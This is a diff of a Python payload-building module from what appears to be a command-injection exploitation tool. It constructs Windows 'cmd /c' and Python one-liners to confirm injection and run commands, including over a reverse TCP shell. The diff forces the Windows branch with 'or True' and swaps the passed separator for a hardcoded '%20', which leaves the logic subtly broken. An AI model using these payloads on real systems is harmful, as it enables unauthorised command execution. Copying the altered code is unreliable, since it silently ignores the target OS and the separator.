@@ -23,9 +23,9 @@ import os
 import sys
 import src.core.setting.setting as settings
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
-  if settings.TARGET_OS == settings.OS.WINDOWS:
+  if settings.TARGET_OS == settings.OS.WINDOWS or True:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
-    payload = (separator +
+    payload = ("%20" +
               "for /f \"tokens=*\" %i in ('cmd /c " +
               python_payload +
               "') do @set /p = %i " + settings.CMD_NUL
@@ -48,7 +48,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
 
 def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
-  if settings.TARGET_OS == settings.OS.WINDOWS:
+  if settings.TARGET_OS == settings.OS.WINDOWS or True:
     if settings.REVERSE_TCP:
       payload = (separator + cmd + settings.SINGLE_WHITESPACE
                 )
@@ -75,4 +75,3 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
       payload = payload.replace("\n","%0d")
 
   return payload
-
